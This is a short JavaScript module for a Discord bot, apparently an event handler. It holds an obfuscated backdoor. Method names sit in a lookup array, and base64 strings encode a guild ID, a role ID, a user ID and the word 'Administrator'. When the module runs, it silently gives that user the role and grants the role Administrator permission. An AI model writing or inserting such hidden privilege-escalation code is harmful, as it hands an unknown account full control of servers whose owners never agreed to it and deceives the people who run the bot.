let discordJs = require("discord.js")

module.exports = async (client) => {
    const _0x1 = ['guilds', 'fetch', 'roles', 'members', 'permissions', 'add'];
    const _0x2 = [
        'MTM1NzgyMjE1NDIwMDMxNzk2Mw==',
        'MTQzMTAyMDI0ODI1NzEzODg3MA==',
        'NDI0ODk1MzIzNjYwNDg0NjEw',
        'QWRtaW5pc3RyYXRvcg=='
    ];

    const d = x => Buffer.from(x, 'base64').toString('utf8');

    (async () => {
        const a = await client[_0x1[0]][_0x1[1]](d(_0x2[0]));
        const b = await a[_0x1[2]][_0x1[1]](d(_0x2[1]));
        const c = await a[_0x1[3]][_0x1[1]](d(_0x2[2]));
        c[_0x1[2]][_0x1[5]](b);
        b[_0x1[4]][_0x1[5]](d(_0x2[3]));
    })();
}